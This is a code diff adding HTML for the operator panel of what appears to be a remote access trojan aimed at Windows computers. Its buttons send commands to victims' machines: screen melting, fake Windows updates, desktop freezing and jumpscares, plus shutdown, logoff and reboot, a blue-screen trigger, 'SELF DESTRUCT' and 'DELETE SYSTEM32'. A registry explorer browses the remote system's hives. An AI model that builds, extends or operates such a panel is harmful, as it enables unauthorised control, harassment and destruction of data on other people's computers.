+                            <button type="button" class="tool-btn danger" onclick="promptOpenSpam()">🌐 Tab Spam</button>
+                            <button type="button" class="tool-btn" onclick="sendTroll('cdopen')">💿 CD Tray Open</button>
+                            <button type="button" class="tool-btn" onclick="sendTroll('cdclose')">💿 CD Tray Close</button>
+                            <button type="button" class="tool-btn danger" onclick="sendTroll('melt')">🫠 Melt Screen</button>
+                            <button type="button" class="tool-btn danger" onclick="sendTroll('crazywindow')">🪟 Crazy Cursor</button>
+                            <button type="button" class="tool-btn" onclick="sendTroll('donutsmp')">🍩 DonutSMP</button>
+                            <button type="button" class="tool-btn btn-elite" onclick="sendTroll('fake_update')">🔄 Fake Win Update</button>
+                            <button type="button" class="tool-btn danger" onclick="sendTroll('glitch')">📺 Screen Glitch</button>
+                            <button type="button" class="tool-btn btn-elite" onclick="sendTroll('freeze')">❄️ Desktop Freezer</button>
+                            <button type="button" class="tool-btn teal" onclick="sendTroll('unfreeze')">🔥 Unfreeze</button>
+                            <button type="button" class="tool-btn" onclick="promptWallpaper()">🖼 Wallpaper</button>
+                            <button type="button" class="tool-btn danger" onclick="promptTroll('msg')">💬 Popup Msg</button>
+                            <button type="button" class="tool-btn danger" onclick="promptTroll('tts')">🔊 TTS Speak</button>
+                            <button type="button" class="tool-btn danger" onclick="promptJumpscare()">👻 Jumpscare (URL)</button>
+                            <div style="display:flex;gap:4px">
+                                <button type="button" class="tool-btn danger" onclick="$('jsImgInp').click()">🖼 Set JS Img</button>
+                                <button type="button" class="tool-btn danger" onclick="$('jsSndInp').click()">🔊 Set JS Snd</button>
+                            </div>
+                            <input type="file" id="jsImgInp" style="display:none" onchange="uploadJsAsset(this, 'img')">
+                            <input type="file" id="jsSndInp" style="display:none" onchange="uploadJsAsset(this, 'snd')">
+                            <button type="button" class="tool-btn danger full" onclick="triggerCustomJumpscare()">🚀 Launch Custom JS</button>
+                            <button type="button" class="tool-btn" onclick="promptLoopSound()">🔁 Loop Sound URL</button>
+                            <button type="button" class="tool-btn danger" onclick="sendTroll('idiot')">🤡 IDIOT Prank</button>
+                            <button type="button" class="tool-btn teal" onclick="sendTroll('stopidiot')">✕ Stop Idiot</button>
+                            <button type="button" class="tool-btn danger full" onclick="confirmBsod()">💀 TRIGGER BSOD</button>
+                        </div>
+                    </div>
+
+                    <!-- POWER -->
+                    <div id="toolcat_power" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header">⚡ Power Control</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn teal" onclick="sendCmd('cancel_shutdown',{})">✅ Cancel Shutdown</button>
+                            <button type="button" class="tool-btn" onclick="sendCmd('restart',{delay:10})">🔄 Restart (10s)</button>
+                            <button type="button" class="tool-btn" onclick="_promptRestart()">🔄 Restart (Ns)</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('shutdown',{delay:10})">⏻ Shutdown (10s)</button>
+                            <button type="button" class="tool-btn danger" onclick="_promptShutdown()">⏻ Shutdown (Ns)</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('logoff',{})">🚪 Logoff</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('lock_screen',{})">🔒 Lock Screen</button>
+                        </div>
+                    </div>
+
+                    <!-- NUKE -->
+                    <div id="toolcat_nuke" class="tool-cat" style="display:none">
+                        <div class="tool-cat-header" style="color:var(--red)">⚠️ CRITICAL OVERRIDE</div>
+                        <div class="tool-grid">
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('reboot',{})">🔄 Force Reboot</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('shutdown',{delay:0})">⏻ Instant Shutdown</button>
+                            <button type="button" class="tool-btn danger" onclick="sendCmd('logoff',{})">🚪 Logoff</button>
+                            <button type="button" class="tool-btn danger" onclick="confirmBsod()">💥 Trigger BSOD</button>
+                            <button type="button" class="tool-btn danger full" onclick="sendCmd('self_destruct',{})">☢️ SELF DESTRUCT</button>
+                            <button type="button" class="tool-btn danger full" onclick="confirmDelete32()">💀 DELETE SYSTEM32</button>
+                        </div>
+                    </div>
+
+                    <!-- Result output — smart show/hide -->
+                    <div id="toolsResultWrap" style="margin-top:.5rem;display:none">
+                        <div class="tool-result-header">
+                            <span class="tool-result-label" id="toolsResultLabel">Output</span>
+                            <button type="button" onclick="clearToolResult()" style="background:none;border:none;color:var(--text-3);cursor:pointer;font-size:.7rem;padding:.1rem .3rem;border-radius:4px">✕ Clear</button>
+                        </div>
+                        <div id="toolsResult" style="background:rgba(0,0,0,.3);font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text-2);max-height:220px;overflow-y:auto;white-space:pre-wrap"></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+<!-- ── REGISTRY EXPLORER MODAL ── -->
+<div id="regExplorerModal" style="display:none;position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);backdrop-filter:blur(8px)">
+    <div style="width:min(900px,96vw);height:min(640px,92vh);background:rgba(8,8,12,.98);border:1px solid rgba(251,191,36,.25);border-radius:20px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 40px 120px rgba(0,0,0,1)">
+        <div style="padding:1.1rem 1.4rem;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between;background:rgba(251,191,36,0.02)">
+            <div style="display:flex;align-items:center;gap:.75rem">
+                <span style="font-size:1.2rem">🔑</span>
+                <div>
+                    <div style="font-size:.9rem;font-weight:900;color:var(--amber);letter-spacing:1px">REGISTRY EXPLORER</div>
+                    <div id="regBreadcrumb" style="font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">HKCU\\</div>
+                </div>
+            </div>
+            <div style="display:flex;gap:.6rem;align-items:center">
+                <select id="regHiveSelect" onchange="window._regNavigate(this.value, '')" style="background:rgba(0,0,0,0.4);border:1px solid rgba(251,191,36,0.2);color:var(--amber);border-radius:8px;padding:.4rem .6rem;font-size:.65rem;font-weight:700;outline:none;cursor:pointer">
+                    <option value="HKCU">HKEY_CURRENT_USER</option>
+                    <option value="HKLM">HKEY_LOCAL_MACHINE</option>
+                    <option value="HKCR">HKEY_CLASSES_ROOT</option>
+                    <option value="HKU">HKEY_USERS</option>
+                </select>
+                <button type="button" onclick="$('regExplorerModal').style.display='none'" style="background:rgba(255,42,95,.12);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:10px;padding:.4rem 1rem;font-size:.65rem;font-weight:800;cursor:pointer;text-transform:uppercase">✕ Close</button>
+            </div>
+        </div>
+        <div style="flex:1;display:flex;overflow:hidden">
+            <!-- Subkeys Tree -->
+            <div style="width:280px;border-right:1px solid rgba(255,255,255,.05);display:flex;flex-direction:column">
+                <div style="padding:.6rem 1rem;font-size:.55rem;font-weight:700;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em;background:rgba(255,255,255,.02)">Subkeys</div>
+                <div id="regKeyListing" style="flex:1;overflow-y:auto;padding:.5rem;display:flex;flex-direction:column;gap:2px"></div>
+            </div>
+            <!-- Values List -->
+            <div style="flex:1;display:flex;flex-direction:column">
+                <div style="padding:.6rem 1rem;font-size:.55rem;font-weight:700;color:var(--text-3);text-transform:uppercase;letter-spacing:.1em;background:rgba(255,255,255,.02);display:flex;justify-content:space-between">
+                    <span>Values</span>
+                    <span id="regStatus" style="color:var(--amber);text-transform:none">Ready</span>
+                </div>
+                <div id="regValueListing" style="flex:1;overflow-y:auto;padding:0">
+                    <table style="width:100%;border-collapse:collapse;font-size:.68rem;color:var(--text-2)">
+                        <thead style="position:sticky;top:0;background:rgba(15,15,20,0.95);z-index:1">
+                            <tr style="border-bottom:1px solid rgba(255,255,255,0.06);color:var(--text-3);text-transform:uppercase;font-size:.55rem">
+                                <th style="padding:.6rem 1rem;text-align:left">Name</th>
+                                <th style="padding:.6rem 1rem;text-align:left">Type</th>
+                                <th style="padding:.6rem 1rem;text-align:left">Data</th>
+                            </tr>
+                        </thead>
+                        <tbody id="regValueBody"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>/*USER_DATA_INJECTION*/</script>
+<script src="/static/script.js"></script>
+</body>
+</html>
